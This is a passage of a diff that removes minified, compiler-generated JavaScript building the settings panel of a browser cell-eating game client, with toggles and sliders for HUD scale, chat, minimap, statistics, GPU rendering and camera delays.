x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show minimap', $s = (0, x.xem)(), $g && $g.c(), $i = (0, x.xem)(), $n = (0, x.ND4)("div"), $a = (0, x.ND4)("input"), $r = (0, x.xem)(), ($l = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show minimap stats', $c = (0, x.xem)(), $m && $m.c(), (0, x.CFu)(a, "type", "range"), (0, x.CFu)(a, "class", "range spacing s-vmzf1o"), (0, x.CFu)(a, "min", "0.5"), (0, x.CFu)(a, "max", "2"), (0, x.CFu)(a, "step", "0.05"), (0, x.CFu)(a, "data-name", "hudScale"), (0, x.CFu)(t, "class", "option spacing s-vmzf1o"), (0, x.CFu)(c, "type", "checkbox"), (0, x.CFu)(c, "id", "show-chat"), (0, x.CFu)(c, "data-name", "showChat"), (0, x.CFu)(c, "class", "s-vmzf1o"), (0, x.CFu)(u, "for", "show-chat"), (0, x.CFu)(u, "class", "s-vmzf1o"), (0, x.CFu)(l, "class", "option s-vmzf1o"), (0, x.CFu)(f, "type", "range"), (0, x.CFu)(f, "class", "range spacing s-vmzf1o"), (0, x.CFu)(f, "min", "200"), (0, x.CFu)(f, "max", "500"), (0, x.CFu)(f, "step", "50"), (0, x.CFu)(f, "data-name", "chatHeight"), (0, x.CFu)(g, "class", "option spacing s-vmzf1o"), (0, x.CFu)(b, "type", "checkbox"), (0, x.CFu)(b, "id", "show-leaderboard"), (0, x.CFu)(b, "data-name", "showLeaderboard"), (0, x.CFu)(b, "class", "s-vmzf1o"), (0, x.CFu)(F, "for", "show-leaderboard"), (0, x.CFu)(F, "class", "s-vmzf1o"), (0, x.CFu)(v, "class", "option s-vmzf1o"), (0, x.CFu)(N, "type", "checkbox"), (0, x.CFu)(N, "id", "show-server-name"), (0, x.CFu)(N, "data-name", "showServerName"), (0, x.CFu)(N, "class", "s-vmzf1o"), (0, x.CFu)(k, "for", "show-server-name"), (0, x.CFu)(k, "class", "s-vmzf1o"), (0, x.CFu)(D, "class", "option s-vmzf1o"), (0, x.CFu)(Y, "type", "checkbox"), (0, x.CFu)(Y, "id", "exclude-bots-on-leaderboard"), (0, x.CFu)(Y, "data-name", "excludeBotsOnLeaderboard"), (0, x.CFu)(Y, "class", "s-vmzf1o"), (0, x.CFu)(U, "for", "exclude-bots-on-leaderboard"), (0, x.CFu)(U, "class", "s-vmzf1o"), (0, x.CFu)(S, "class", "option s-vmzf1o"), (0, x.CFu)(K, "type", "checkbox"), (0, x.CFu)(K, "id", "show-stats"), (0, x.CFu)(K, "data-name", "showStats"), (0, x.CFu)(K, "class", "s-vmzf1o"), (0, x.CFu)(P, "for", "show-stats"), (0, x.CFu)(P, "class", "s-vmzf1o"), (0, x.CFu)(W, "class", "option s-vmzf1o"), (0, x.CFu)($$, "type", "checkbox"), (0, x.CFu)($$, "id", "show-minimap"), (0, x.CFu)($$, "data-name", "minimapEnabled"), (0, x.CFu)($$, "class", "s-vmzf1o"), (0, x.CFu)($x, "for", "show-minimap"), (0, x.CFu)($x, "class", "s-vmzf1o"), (0, x.CFu)(O, "class", "option s-vmzf1o"), (0, x.CFu)($a, "type", "checkbox"), (0, x.CFu)($a, "id", "show-minimap-stats"), (0, x.CFu)($a, "data-name", "showMinimapStats"), (0, x.CFu)($a, "class", "s-vmzf1o"), (0, x.CFu)($l, "for", "show-minimap-stats"), (0, x.CFu)($l, "class", "s-vmzf1o"), (0, x.CFu)($n, "class", "option s-vmzf1o"), (0, x.CFu)(e, "class", "content s-vmzf1o")
-                        },
-                        m(i, C) {
-                            (0, x.Yry)(i, e, C), (0, x.BCw)(e, t), (0, x.BCw)(t, s), $u.m(t, null), (0, x.BCw)(t, n), (0, x.BCw)(t, a), (0, x.BCw)(e, r), (0, x.BCw)(e, l), (0, x.BCw)(l, c), (0, x.BCw)(l, A), (0, x.BCw)(l, u), (0, x.BCw)(e, d), (0, x.BCw)(e, g), (0, x.BCw)(g, m), $d.m(g, null), (0, x.BCw)(g, p), (0, x.BCw)(g, f), (0, x.BCw)(e, w), (0, x.BCw)(e, v), (0, x.BCw)(v, b), (0, x.BCw)(v, B), (0, x.BCw)(v, F), (0, x.BCw)(e, I), (0, x.BCw)(e, D), (0, x.BCw)(D, N), (0, x.BCw)(D, Q), (0, x.BCw)(D, k), (0, x.BCw)(e, T), (0, x.BCw)(e, S), (0, x.BCw)(S, Y), (0, x.BCw)(S, H), (0, x.BCw)(S, U), (0, x.BCw)(e, q), (0, x.BCw)(e, W), (0, x.BCw)(W, K), (0, x.BCw)(W, J), (0, x.BCw)(W, P), (0, x.BCw)(e, V), $0 && $0.m(e, null), (0, x.BCw)(e, Z), (0, x.BCw)(e, O), (0, x.BCw)(O, $$), (0, x.BCw)(O, $t), (0, x.BCw)(O, $x), (0, x.BCw)(e, $s), $g && $g.m(e, null), (0, x.BCw)(e, $i), (0, x.BCw)(e, $n), (0, x.BCw)($n, $a), (0, x.BCw)($n, $r), (0, x.BCw)($n, $l), (0, x.BCw)(e, $c), $m && $m.m(e, null), $h || ($A = [(0, x.KTR)(a, "input", $[12]), (0, x.hGc)(o = $[13].call(null, a)), (0, x.KTR)(c, "change", $[12]), (0, x.hGc)(h = $[13].call(null, c)), (0, x.KTR)(f, "input", $[12]), (0, x.hGc)(_ = $[13].call(null, f)), (0, x.KTR)(b, "change", $[12]), (0, x.hGc)(y = $[13].call(null, b)), (0, x.KTR)(N, "change", $[12]), (0, x.hGc)(E = $[13].call(null, N)), (0, x.KTR)(Y, "change", $[12]), (0, x.hGc)(G = $[13].call(null, Y)), (0, x.KTR)(K, "change", $[12]), (0, x.hGc)(X = $[13].call(null, K)), (0, x.KTR)($$, "change", $[12]), (0, x.hGc)($e = $[13].call(null, $$)), (0, x.KTR)($a, "change", $[12]), (0, x.hGc)($o = $[13].call(null, $a))], $h = !0)
-                        },
-                        p($, s) {
-                            8 & s && (0, x.jXN)(i, i = $[3]) ? ($u.d(1), ($u = z()).c(), $u.m(t, n)) : $u.p($, s), 8 & s && (0, x.jXN)(C, C = $[3]) ? ($d.d(1), ($d = R()).c(), $d.m(g, p)) : $d.p($, s), $[7] ? $0 ? $0.p($, s) : (($0 = M($)).c(), $0.m(e, Z)) : $0 && ($0.d(1), $0 = null), $[8] ? $g ? $g.p($, s) : (($g = L($)).c(), $g.m(e, $i)) : $g && ($g.d(1), $g = null), $[9] ? $m ? $m.p($, s) : (($m = j($)).c(), $m.m(e, null)) : $m && ($m.d(1), $m = null)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), $u.d($), $d.d($), $0 && $0.d(), $g && $g.d(), $m && $m.d(), ($h = !1, x.oOW)($A)
-                        }
-                    }
-                }
-
-                function z() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = Math.round(100 * r.A.org("hudScale")) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function R() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = r.A.org("chatHeight") + "px", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function M($) {
-                    let e, t, s, i, n, a, o, r, l, c, h, A, u, d, g, m, C, p, f, _, w, v, b, y, B, F, I, D, N, E, Q, k, T, S, Y, z, R;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("input"), i = (0, x.xem)(), (n = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: FPS', a = (0, x.xem)(), o = (0, x.ND4)("div"), r = (0, x.ND4)("input"), c = (0, x.xem)(), (h = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: Ping', A = (0, x.xem)(), u = (0, x.ND4)("div"), d = (0, x.ND4)("input"), m = (0, x.xem)(), (C = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: Total Mass', p = (0, x.xem)(), f = (0, x.ND4)("div"), _ = (0, x.ND4)("input"), v = (0, x.xem)(), (b = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: Mass', y = (0, x.xem)(), B = (0, x.ND4)("div"), F = (0, x.ND4)("input"), D = (0, x.xem)(), (N = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: Score', E = (0, x.xem)(), Q = (0, x.ND4)("div"), k = (0, x.ND4)("input"), S = (0, x.xem)(), (Y = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Stats: Cell count', (0, x.CFu)(t, "type", "checkbox"), (0, x.CFu)(t, "id", "show-fps"), (0, x.CFu)(t, "data-name", "showFPS"), (0, x.CFu)(t, "class", "s-vmzf1o"), (0, x.CFu)(n, "for", "show-fps"), (0, x.CFu)(n, "class", "s-vmzf1o"), (0, x.CFu)(e, "class", "option s-vmzf1o"), (0, x.CFu)(r, "type", "checkbox"), (0, x.CFu)(r, "id", "show-ping"), (0, x.CFu)(r, "data-name", "showPing"), (0, x.CFu)(r, "class", "s-vmzf1o"), (0, x.CFu)(h, "for", "show-ping"), (0, x.CFu)(h, "class", "s-vmzf1o"), (0, x.CFu)(o, "class", "option s-vmzf1o"), (0, x.CFu)(o, "data-tip", "Ping of the active tab"), (0, x.CFu)(d, "type", "checkbox"), (0, x.CFu)(d, "id", "show-mass"), (0, x.CFu)(d, "data-name", "showPlayerMass"), (0, x.CFu)(d, "class", "s-vmzf1o"), (0, x.CFu)(C, "for", "show-mass"), (0, x.CFu)(C, "class", "s-vmzf1o"), (0, x.CFu)(u, "class", "option s-vmzf1o"), (0, x.CFu)(u, "data-tip", "Current mass of the active tab"), (0, x.CFu)(_, "type", "checkbox"), (0, x.CFu)(_, "id", "show-total-mass"), (0, x.CFu)(_, "data-name", "showTotalPlayerMass"), (0, x.CFu)(_, "class", "s-vmzf1o"), (0, x.CFu)(b, "for", "show-total-mass"), (0, x.CFu)(b, "class", "s-vmzf1o"), (0, x.CFu)(f, "class", "option s-vmzf1o"), (0, x.CFu)(f, "data-tip", "Total mass of both tabs"), (0, x.CFu)(F, "type", "checkbox"), (0, x.CFu)(F, "id", "show-highest-score"), (0, x.CFu)(F, "data-name", "showPlayerScore"), (0, x.CFu)(F, "class", "s-vmzf1o"), (0, x.CFu)(N, "for", "show-highest-score"), (0, x.CFu)(N, "class", "s-vmzf1o"), (0, x.CFu)(B, "class", "option s-vmzf1o"), (0, x.CFu)(B, "data-tip", "Highest score of the active tab"), (0, x.CFu)(k, "type", "checkbox"), (0, x.CFu)(k, "id", "show-cell-count"), (0, x.CFu)(k, "data-name", "showCellCount"), (0, x.CFu)(k, "class", "s-vmzf1o"), (0, x.CFu)(Y, "for", "show-cell-count"), (0, x.CFu)(Y, "class", "s-vmzf1o"), (0, x.CFu)(Q, "class", "option s-vmzf1o"), (0, x.CFu)(Q, "data-tip", "Cell count of the active tab")
-                        },
-                        m(M, L) {
-                            (0, x.Yry)(M, e, L), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n), (0, x.Yry)(M, a, L), (0, x.Yry)(M, o, L), (0, x.BCw)(o, r), (0, x.BCw)(o, c), (0, x.BCw)(o, h), (0, x.Yry)(M, A, L), (0, x.Yry)(M, u, L), (0, x.BCw)(u, d), (0, x.BCw)(u, m), (0, x.BCw)(u, C), (0, x.Yry)(M, p, L), (0, x.Yry)(M, f, L), (0, x.BCw)(f, _), (0, x.BCw)(f, v), (0, x.BCw)(f, b), (0, x.Yry)(M, y, L), (0, x.Yry)(M, B, L), (0, x.BCw)(B, F), (0, x.BCw)(B, D), (0, x.BCw)(B, N), (0, x.Yry)(M, E, L), (0, x.Yry)(M, Q, L), (0, x.BCw)(Q, k), (0, x.BCw)(Q, S), (0, x.BCw)(Q, Y), z || (R = [(0, x.KTR)(t, "change", $[12]), (0, x.hGc)(s = $[13].call(null, t)), (0, x.KTR)(r, "change", $[12]), (0, x.hGc)(l = $[13].call(null, r)), (0, x.KTR)(d, "change", $[12]), (0, x.hGc)(g = $[13].call(null, d)), (0, x.KTR)(_, "change", $[12]), (0, x.hGc)(w = $[13].call(null, _)), (0, x.KTR)(F, "change", $[12]), (0, x.hGc)(I = $[13].call(null, F)), (0, x.KTR)(k, "change", $[12]), (0, x.hGc)(T = $[13].call(null, k))], z = !0)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(a), (0, x.YoD)(o), (0, x.YoD)(A), (0, x.YoD)(u), (0, x.YoD)(p), (0, x.YoD)(f), (0, x.YoD)(y), (0, x.YoD)(B), (0, x.YoD)(E), (0, x.YoD)(Q)), (z = !1, x.oOW)(R)
-                        }
-                    }
-                }
-
-                function L($) {
-                    let e, t, s, i, n, a, o, r, l = $[3],
-                        c, h, A, u, d, g = G();
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("input"), i = (0, x.xem)(), (n = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Show locations', a = (0, x.xem)(), o = (0, x.ND4)("div"), r = (0, x.Qq7)("Minimap: Resolution\r\n                    "), g.c(), c = (0, x.xem)(), h = (0, x.ND4)("input"), (0, x.CFu)(t, "type", "checkbox"), (0, x.CFu)(t, "id", "show-locations"), (0, x.CFu)(t, "data-name", "minimapLocations"), (0, x.CFu)(t, "class", "s-vmzf1o"), (0, x.CFu)(n, "for", "show-locations"), (0, x.CFu)(n, "class", "s-vmzf1o"), (0, x.CFu)(e, "class", "option s-vmzf1o"), (0, x.CFu)(e, "data-tip", "Show informal grid codes on the player map"), (0, x.CFu)(h, "type", "range"), (0, x.CFu)(h, "class", "range spacing s-vmzf1o"), (0, x.CFu)(h, "min", "0.5"), (0, x.CFu)(h, "max", "2"), (0, x.CFu)(h, "step", "0.05"), (0, x.CFu)(h, "data-name", "minimapResolution"), (0, x.CFu)(o, "class", "option s-vmzf1o"), (0, x.CFu)(o, "data-tip", "Lower for performance, higher for sharpness")
-                        },
-                        m(l, m) {
-                            (0, x.Yry)(l, e, m), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n), (0, x.Yry)(l, a, m), (0, x.Yry)(l, o, m), (0, x.BCw)(o, r), g.m(o, null), (0, x.BCw)(o, c), (0, x.BCw)(o, h), u || (d = [(0, x.KTR)(t, "change", $[12]), (0, x.hGc)(s = $[13].call(null, t)), (0, x.KTR)(h, "input", $[12]), (0, x.KTR)(h, "change", $[19]), (0, x.hGc)(A = $[13].call(null, h))], u = !0)
-                        },
-                        p($, e) {
-                            8 & e && (0, x.jXN)(l, l = $[3]) ? (g.d(1), (g = G()).c(), g.m(o, c)) : g.p($, e)
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(a), (0, x.YoD)(o)), g.d($), (u = !1, x.oOW)(d)
-                        }
-                    }
-                }
-
-                function G() {
-                    let $;
-                    return {
-                        c() {
-                            ($ = (0, x.ND4)("span")).textContent = (100 * r.A.org("minimapResolution")).toFixed(0) + "%", (0, x.CFu)($, "class", "silent right s-vmzf1o")
-                        },
-                        m(e, t) {
-                            (0, x.Yry)(e, $, t)
-                        },
-                        p: x.lQ1,
-                        d(e) {
-                            e && (0, x.YoD)($)
-                        }
-                    }
-                }
-
-                function j($) {
-                    let e, t, s, i, n, a, o, r, l, c, h, A, u, d, g, m, C, p, f, _, w, v, b, y, B, F, I, D, N, E, Q, k, T, S, Y, z, R;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("input"), i = (0, x.xem)(), (n = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: System time', a = (0, x.xem)(), o = (0, x.ND4)("div"), r = (0, x.ND4)("input"), c = (0, x.xem)(), (h = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Session time', A = (0, x.xem)(), u = (0, x.ND4)("div"), d = (0, x.ND4)("input"), m = (0, x.xem)(), (C = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Players in server', p = (0, x.xem)(), f = (0, x.ND4)("div"), _ = (0, x.ND4)("input"), v = (0, x.xem)(), (b = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Spectators', y = (0, x.xem)(), B = (0, x.ND4)("div"), F = (0, x.ND4)("input"), D = (0, x.xem)(), (N = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Tag&#39;s total mass', E = (0, x.xem)(), Q = (0, x.ND4)("div"), k = (0, x.ND4)("input"), S = (0, x.xem)(), (Y = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Minimap: Server restart time', (0, x.CFu)(t, "type", "checkbox"), (0, x.CFu)(t, "id", "show-system-time"), (0, x.CFu)(t, "data-name", "showClock"), (0, x.CFu)(t, "class", "s-vmzf1o"), (0, x.CFu)(n, "for", "show-system-time"), (0, x.CFu)(n, "class", "s-vmzf1o"), (0, x.CFu)(e, "class", "option s-vmzf1o"), (0, x.CFu)(r, "type", "checkbox"), (0, x.CFu)(r, "id", "show-session-time"), (0, x.CFu)(r, "data-name", "showSessionTime"), (0, x.CFu)(r, "class", "s-vmzf1o"), (0, x.CFu)(h, "for", "show-session-time"), (0, x.CFu)(h, "class", "s-vmzf1o"), (0, x.CFu)(o, "class", "option s-vmzf1o"), (0, x.CFu)(d, "type", "checkbox"), (0, x.CFu)(d, "id", "show-player-count"), (0, x.CFu)(d, "data-name", "showPlayerCount"), (0, x.CFu)(d, "class", "s-vmzf1o"), (0, x.CFu)(C, "for", "show-player-count"), (0, x.CFu)(C, "class", "s-vmzf1o"), (0, x.CFu)(u, "class", "option s-vmzf1o"), (0, x.CFu)(_, "type", "checkbox"), (0, x.CFu)(_, "id", "show-spectators"), (0, x.CFu)(_, "data-name", "showSpectators"), (0, x.CFu)(_, "class", "s-vmzf1o"), (0, x.CFu)(b, "for", "show-spectators"), (0, x.CFu)(b, "class", "s-vmzf1o"), (0, x.CFu)(f, "class", "option s-vmzf1o"), (0, x.CFu)(F, "type", "checkbox"), (0, x.CFu)(F, "id", "show-tag-total-score"), (0, x.CFu)(F, "data-name", "showTagTotalMass"), (0, x.CFu)(F, "data-tip", "The total mass of your active tab's tag, this does not work for global tag"), (0, x.CFu)(F, "class", "s-vmzf1o"), (0, x.CFu)(N, "for", "show-tag-total-score"), (0, x.CFu)(N, "class", "s-vmzf1o"), (0, x.CFu)(B, "class", "option s-vmzf1o"), (0, x.CFu)(k, "type", "checkbox"), (0, x.CFu)(k, "id", "show-restart-time"), (0, x.CFu)(k, "data-name", "showRestartTiming"), (0, x.CFu)(k, "class", "s-vmzf1o"), (0, x.CFu)(Y, "for", "show-restart-time"), (0, x.CFu)(Y, "class", "s-vmzf1o"), (0, x.CFu)(Q, "class", "option s-vmzf1o")
-                        },
-                        m(M, L) {
-                            (0, x.Yry)(M, e, L), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n), (0, x.Yry)(M, a, L), (0, x.Yry)(M, o, L), (0, x.BCw)(o, r), (0, x.BCw)(o, c), (0, x.BCw)(o, h), (0, x.Yry)(M, A, L), (0, x.Yry)(M, u, L), (0, x.BCw)(u, d), (0, x.BCw)(u, m), (0, x.BCw)(u, C), (0, x.Yry)(M, p, L), (0, x.Yry)(M, f, L), (0, x.BCw)(f, _), (0, x.BCw)(f, v), (0, x.BCw)(f, b), (0, x.Yry)(M, y, L), (0, x.Yry)(M, B, L), (0, x.BCw)(B, F), (0, x.BCw)(B, D), (0, x.BCw)(B, N), (0, x.Yry)(M, E, L), (0, x.Yry)(M, Q, L), (0, x.BCw)(Q, k), (0, x.BCw)(Q, S), (0, x.BCw)(Q, Y), z || (R = [(0, x.KTR)(t, "change", $[12]), (0, x.hGc)(s = $[13].call(null, t)), (0, x.KTR)(r, "change", $[12]), (0, x.hGc)(l = $[13].call(null, r)), (0, x.KTR)(d, "change", $[12]), (0, x.hGc)(g = $[13].call(null, d)), (0, x.KTR)(_, "change", $[12]), (0, x.hGc)(w = $[13].call(null, _)), (0, x.KTR)(F, "change", $[12]), (0, x.hGc)(I = $[13].call(null, F)), (0, x.KTR)(k, "change", $[12]), (0, x.hGc)(T = $[13].call(null, k))], z = !0)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(a), (0, x.YoD)(o), (0, x.YoD)(A), (0, x.YoD)(u), (0, x.YoD)(p), (0, x.YoD)(f), (0, x.YoD)(y), (0, x.YoD)(B), (0, x.YoD)(E), (0, x.YoD)(Q)), (z = !1, x.oOW)(R)
-                        }
-                    }
-                }
-
-                function H($) {
-                    var e;
-                    let t, s, i, n, a, o, r, c, A, u, E, z, R, M, L, G, j, H, U, q, W = h.utils.isWebGLSupported(),
-                        K, X, J, P, V, Z, O, $$, $e, $t = $[3],
-                        $x, $s, $i, $n, $a, $o, $r = $[3],
-                        $l, $c, $h, $A, $u, $d, $0, $g, $m, $C, $p, $f, $_, $w, $v, $b, $y, $B, $F, $I, $D, $2, $N, $E = $[3],
-                        $Q, $k, $T, $S, $Y, $z, $R, $5, $6, $M, $L, $1, $9, $3, $G, $4, $j, $H, $U, $7, $q, $W = $[3],
-                        $K, $X, $J, $P, $V, $Z, $O = $[3],
-                        $8, e$, ee, et, ex, es, ei = $[3],
-                        en, ea, eo, er, el, ec, eh = $[3],
-                        eA, eu, ed, e0, eg, em, eC = $[3],
-                        ep, ef, e_, ew, ev, eb, ey = $[3],
-                        eB, eF, eI, eD, e2, eN, eE, eQ, ek, eT, eS = $[3],
-                        eY, ez, eR, e5, e6, eM, eL, e1, e9 = $[3],
-                        e3, eG, e4, ej, eH, eU = $[3],
-                        e7, eq, eW, eK, eX, eJ = $[3],
-                        eP, eV, eZ, eO, e8, t$, te, tt, tx, ts, ti, tn, ta, to, tr, tl, tc, th, tA, tu, td, t0, tg, tm, tC, tp, tf, t_, tw, tv, tb, ty, tB, tF, tI, tD, t2, tN, tE, tQ, tk, tT, tS, tY, tz, tR, t5, t6, tM, tL, t1, t9, t3, tG, t4, tj, tH, tU, t7, tq, tW, tK, tX, tJ, tP, tV, tZ, tO, t8, x$, xe, xt, xx, xs, xi, xn, xa, xo, xr, xl, xc, xh, xA, xu, xd, x0, xg, xm, xC, xp, xf, x_, xw, xv, xb = $[3],
-                        xy, xB, xF, xI, xD, x2, xN, xE, xQ, xk, xT, xS, xY = $[3],
-                        xz, xR, x5, x6, xM = $[3],
-                        xL, x1, x9, x3, xG, x4, xj, xH, xU, x7, xq, xW, xK, xX = (h.utils.isWebGLSupported() ? g : d)($),
-                        xJ = W && (e = $, {
-                            c() {
-                                t = (0, x.ND4)("div"), s = (0, x.ND4)("input"), n = (0, x.xem)(), (a = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Use GPU rendering', (0, x.CFu)(s, "type", "checkbox"), (0, x.CFu)(s, "id", "web-gl"), (0, x.CFu)(s, "data-name", "useWebGL"), (0, x.CFu)(s, "class", "s-vmzf1o"), (0, x.CFu)(a, "for", "web-gl"), (0, x.CFu)(a, "class", "s-vmzf1o"), (0, x.CFu)(t, "class", "option s-vmzf1o"), (0, x.CFu)(t, "data-tip", "Detrimental to performance, heavy performance loss is encountered without a GPU")
-                            },
-                            m($, l) {
-                                (0, x.Yry)($, t, l), (0, x.BCw)(t, s), (0, x.BCw)(t, n), (0, x.BCw)(t, a), o || (r = [(0, x.KTR)(s, "change", e[12]), (0, x.hGc)(i = e[13].call(null, s))], o = !0)
-                            },
-                            p: x.lQ1,
-                            d($) {
-                                $ && (0, x.YoD)(t), (o = !1, x.oOW)(r)
-                            }
-                        }),
-                        xP = m(),
-                        xV = C(),
-                        xZ = p(),
-                        xO = f(),
-                        x8 = _(),
-                        s$ = w(),
-                        se = v(),
-                        st = b(),
-                        sx = y(),
-                        ss = B(),
-                        si = F($),
-                        sn = I($),
-                        sa = D($),
-                        so = $[4] && N($),
-                        sr = Q($),
-                        sl = k($),
-                        sc = $[5] && T($),
-                        sh = S(),
-                        sA = $[6] && Y($);
-                    return {
-                        c() {
-                            c = (0, x.ND4)("div"), A = (0, x.ND4)("div"), (u = (0, x.ND4)("span")).textContent = "Settings", E = (0, x.xem)(), (z = (0, x.ND4)("button")).innerHTML = '<i class="fal fa-times"></i>', R = (0, x.xem)(), M = (0, x.ND4)("div"), L = (0, x.ND4)("div"), G = (0, x.ND4)("div"), (j = (0, x.ND4)("span")).textContent = "Renderer", H = (0, x.xem)(), xX.c(), U = (0, x.xem)(), q = (0, x.ND4)("div"), xJ && xJ.c(), K = (0, x.xem)(), X = (0, x.ND4)("div"), J = (0, x.ND4)("input"), V = (0, x.xem)(), (Z = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Use anti-aliasing', O = (0, x.xem)(), $$ = (0, x.ND4)("div"), $e = (0, x.Qq7)("Renderer resolution\r\n                    "), xP.c(), $x = (0, x.xem)(), $s = (0, x.ND4)("input"), $n = (0, x.xem)(), $a = (0, x.ND4)("div"), $o = (0, x.Qq7)("Text hiding threshold\r\n                    "), xV.c(), $l = (0, x.xem)(), $c = (0, x.ND4)("input"), $A = (0, x.xem)(), $u = (0, x.ND4)("div"), $d = (0, x.ND4)("div"), ($0 = (0, x.ND4)("span")).textContent = "Game", $g = (0, x.xem)(), ($m = (0, x.ND4)("span")).textContent = "v" + l.rE, $C = (0, x.xem)(), $p = (0, x.ND4)("div"), $f = (0, x.ND4)("div"), $_ = (0, x.ND4)("input"), $v = (0, x.xem)(), ($b = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Auto zoom', $y = (0, x.xem)(), $B = (0, x.ND4)("div"), $F = (0, x.ND4)("input"), $D = (0, x.xem)(), ($2 = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Remember ejecting', $N = (0, x.xem)(), xZ.c(), $Q = (0, x.xem)(), $k = (0, x.ND4)("div"), $T = (0, x.ND4)("input"), $Y = (0, x.xem)(), ($z = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Auto respawn', $R = (0, x.xem)(), $5 = (0, x.ND4)("div"), $6 = (0, x.ND4)("input"), $L = (0, x.xem)(), ($1 = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Soft mouse freeze', $9 = (0, x.xem)(), $3 = (0, x.ND4)("div"), $G = (0, x.ND4)("input"), $j = (0, x.xem)(), ($H = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Delayed doublesplit hotkey', $U = (0, x.xem)(), $7 = (0, x.ND4)("div"), $q = (0, x.Qq7)("Draw delay\r\n                    "), xO.c(), $K = (0, x.xem)(), $X = (0, x.ND4)("input"), $P = (0, x.xem)(), $V = (0, x.ND4)("div"), $Z = (0, x.Qq7)("Camera panning delay\r\n                    "), x8.c(), $8 = (0, x.xem)(), e$ = (0, x.ND4)("input"), et = (0, x.xem)(), ex = (0, x.ND4)("div"), es = (0, x.Qq7)("Camera switch delay\r\n                    "), s$.c(), en = (0, x.xem)(), ea = (0, x.ND4)("input"), er = (0, x.xem)(), el = (0, x.ND4)("div"), ec = (0, x.Qq7)("Camera zooming delay\r\n                    "), se.c(), eA = (0, x.xem)(), eu = (0, x.ND4)("input"), e0 = (0, x.xem)(), eg = (0, x.ND4)("div"), em = (0, x.Qq7)("Scroll zoom rate\r\n                    "), st.c(), ep = (0, x.xem)(), ef = (0, x.ND4)("input"), ew = (0, x.xem)(), ev = (0, x.ND4)("div"), eb = (0, x.Qq7)("Linesplit auto unlock delay\r\n                    "), sx.c(), eB = (0, x.xem)(), eF = (0, x.ND4)("input"), eD = (0, x.xem)(), e2 = (0, x.ND4)("div"), (eN = (0, x.ND4)("div")).innerHTML = '<span class="label s-vmzf1o">Cells</span>', eE = (0, x.xem)(), eQ = (0, x.ND4)("div"), ek = (0, x.ND4)("div"), eT = (0, x.Qq7)("Cells opacity\r\n                    "), ss.c(), eY = (0, x.xem)(), ez = (0, x.ND4)("input"), e5 = (0, x.xem)(), e6 = (0, x.ND4)("div"), eM = (0, x.ND4)("input"), e1 = (0, x.xem)(), si.c(), e3 = (0, x.xem)(), eG = (0, x.ND4)("div"), e4 = (0, x.ND4)("input"), eH = (0, x.xem)(), sn.c(), e7 = (0, x.xem)(), eq = (0, x.ND4)("div"), eW = (0, x.ND4)("input"), eX = (0, x.xem)(), sa.c(), eP = (0, x.xem)(), eV = (0, x.ND4)("div"), eZ = (0, x.ND4)("input"), e8 = (0, x.xem)(), (t$ = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show my own name', te = (0, x.xem)(), tt = (0, x.ND4)("div"), tx = (0, x.ND4)("input"), ti = (0, x.xem)(), (tn = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show my own skin', ta = (0, x.xem)(), to = (0, x.ND4)("div"), tr = (0, x.ND4)("input"), tc = (0, x.xem)(), (th = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show my own mass', tA = (0, x.xem)(), tu = (0, x.ND4)("div"), td = (0, x.ND4)("input"), tg = (0, x.xem)(), (tm = (0, x.ND4)("label")).innerHTML = '<span class="s-vmzf1o"></span> Show crown', tC = (0, x.xem)(), tp = (0, x.ND4)("div"), tf = (0, 